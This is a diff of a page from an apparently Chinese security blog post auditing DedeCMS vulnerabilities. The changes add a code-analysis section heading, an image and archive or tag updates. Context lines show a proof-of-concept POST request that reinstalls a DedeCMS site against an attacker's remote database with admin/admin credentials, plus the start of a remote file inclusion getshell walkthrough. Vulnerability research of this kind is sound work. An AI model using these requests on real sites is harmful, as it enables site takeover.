@@ -29,6 +29,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gsl2d0171wj30qb04gdie.jpg">
 <meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2c82a80j317v0ljdo6.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gtcps32mohj30y40ir4al.jpg">
 <meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gsl2d7emtzj613v0gvalh02.jpg">
 <meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gsl2ddzn0sj311f04ddiu.jpg">
 <meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gsl2dk7c24j30uj05u43r.jpg">
@@ -63,7 +64,7 @@
 <meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2hqdr1uj30og0e6dnp.jpg">
 <meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gsl2hvxzrgj311a0brwls.jpg">
 <meta property="article:published_time" content="2021-07-21T06:06:00.000Z">
-<meta property="article:modified_time" content="2021-08-09T01:01:47.408Z">
+<meta property="article:modified_time" content="2021-08-11T04:01:15.736Z">
 <meta property="article:author" content="R0ser1">
 <meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary">
@@ -508,7 +509,7 @@ height:50vh;
 <p>所以我们需要一个远程可连接的公网数据库,将数据库安装到我们服务器，网站还是在他的服务器。</p>
 <p>POC如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;install&#x2F;index.php.bak?insLockfile&#x3D;1&amp;step&#x3D;4</span><br><span class="line"></span><br><span class="line">&#x2F;install&#x2F;index.php.bak?insLockfile&#x3D;1&amp;step&#x3D;4</span><br><span class="line">step&#x3D;4&amp;dbhost&#x3D;远程地址&amp;dbuser&#x3D;用户名&amp;dbpwd&#x3D;密码&amp;dbprefix&#x3D;dede_&amp;dbname&#x3D;dede111&amp;dblang&#x3D;gbk&amp;adminuser&#x3D;admin&amp;adminpwd&#x3D;admin&amp;cookieencode&#x3D;JzIVw7439H&amp;webname&#x3D;1111&amp;adminmail&#x3D;admin@dedecms.com&amp;baseurl&#x3D;http:&#x2F;&#x2F;www.xxx.com&amp;cmspath&#x3D;</span><br></pre></td></tr></table></figure>
-
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gtcps32mohj30y40ir4al.jpg" alt="image-20210811120050042"></p>
 <h1 id="DedeCMS远程文件包含漏洞GETSHELL"><a href="#DedeCMS远程文件包含漏洞GETSHELL" class="headerlink" title="DedeCMS远程文件包含漏洞GETSHELL"></a>DedeCMS远程文件包含漏洞GETSHELL</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里我们用的版本是20120430，版本查看<code>/data/admin/ver.txt</code>。<br>第一步我们需要准备一个远程文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.x.com&#x2F;dedecms&#x2F;demodata.a.txt  &#x2F;&#x2F;必须这样子命名 a可以变化</span><br></pre></td></tr></table></figure>
 
@@ -852,7 +853,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DedeCMS%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">DedeCMS重装漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DedeCMS%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9EGETSHELL"><span class="toc-number">2.</span> <span class="toc-text">DedeCMS远程文件包含漏洞GETSHELL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DedeCMS%E7%9A%84download%E6%96%87%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E5%92%8CGEThsell"><span class="toc-number">3.</span> <span class="toc-text">DedeCMS的download文件SQL注入和GEThsell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DedeCMS-recommend%E6%96%87%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">DedeCMS recommend文件SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DedeCMS-%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5%E7%94%B3%E8%AF%B7-Getshell"><span class="toc-number">5.</span> <span class="toc-text">DedeCMS 友情链接申请 Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">5.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DedeCMS-%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">DedeCMS 密码修改漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DedeCMS%E5%90%8E%E5%8F%B0%E8%B7%AF%E5%BE%84%E7%88%86%E7%A0%B4"><span class="toc-number">6.1.</span> <span class="toc-text">DedeCMS后台路径爆破</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DedeCMS%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">DedeCMS重装漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">代码分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DedeCMS%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9EGETSHELL"><span class="toc-number">2.</span> <span class="toc-text">DedeCMS远程文件包含漏洞GETSHELL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DedeCMS%E7%9A%84download%E6%96%87%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E5%92%8CGEThsell"><span class="toc-number">3.</span> <span class="toc-text">DedeCMS的download文件SQL注入和GEThsell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DedeCMS-recommend%E6%96%87%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">DedeCMS recommend文件SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DedeCMS-%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5%E7%94%B3%E8%AF%B7-Getshell"><span class="toc-number">5.</span> <span class="toc-text">DedeCMS 友情链接申请 Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">5.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DedeCMS-%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">DedeCMS 密码修改漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DedeCMS%E5%90%8E%E5%8F%B0%E8%B7%AF%E5%BE%84%E7%88%86%E7%A0%B4"><span class="toc-number">6.1.</span> <span class="toc-text">DedeCMS后台路径爆破</span></a></li></ol></li></ol>
     </div>
     
     <div class="sidebar sidebar-hide">
@@ -1074,9 +1075,26 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 18
+        Total : 19
         </div>
         <!-- search  -->
         
@@ -1089,6 +1107,11 @@ top:50vh;
     
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2021/08/11/JS/" >JS(密文保护)</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1185,11 +1208,13 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
-    
         <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
     
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
         <span class="sidebar-tag-name" data-tags="meterpreter"><span class="iconfont-archer">&#xe606;</span>meterpreter</span>
+    
+        <span class="sidebar-tag-name" data-tags="Laravel"><span class="iconfont-archer">&#xe606;</span>Laravel</span>
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
@@ -1198,8 +1223,6 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="杂七杂八"><span class="iconfont-archer">&#xe606;</span>杂七杂八</span>
     
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
-    
-        <span class="sidebar-tag-name" data-tags="Laravel"><span class="iconfont-archer">&#xe606;</span>Laravel</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
